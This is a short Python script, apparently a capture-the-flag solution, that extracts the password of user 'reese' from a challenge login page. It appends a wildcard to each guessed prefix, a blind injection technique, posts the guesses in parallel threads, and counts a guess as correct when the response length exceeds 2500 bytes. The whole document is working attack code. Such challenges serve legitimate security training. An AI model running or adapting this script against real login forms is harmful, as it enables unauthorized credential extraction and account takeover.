import concurrent.futures
import requests
import string

URL = "http://94.237.62.149:56117" # Replace this with your challenge address
CHARACTERS = string.ascii_letters + string.digits + '{}' + '_'
MAX_WORKERS = 10  # Adjust based on your system's capability


def brute_force_character(current_password, index):
    char = CHARACTERS[index]
    choice =  current_password + char + '*'
    data = {'username': 'reese', 'password': choice}
    r = requests.post(f'{URL}/login', data=data)
    content_length = int(r.headers['Content-Length'])
    if content_length > 2500:
        return char
    return None


def find_next_character(current_password):
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        futures = [executor.submit(brute_force_character, current_password, i) for i in range(len(CHARACTERS))]
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                return result
    return None


def brute():
    result = ''
    while True:
        next_char = find_next_character(result)
        if next_char:
            result += next_char
            print(f'[~] Bruteforcing Status: {result}')
        else:
            break

if __name__ == '__main__':
    brute()
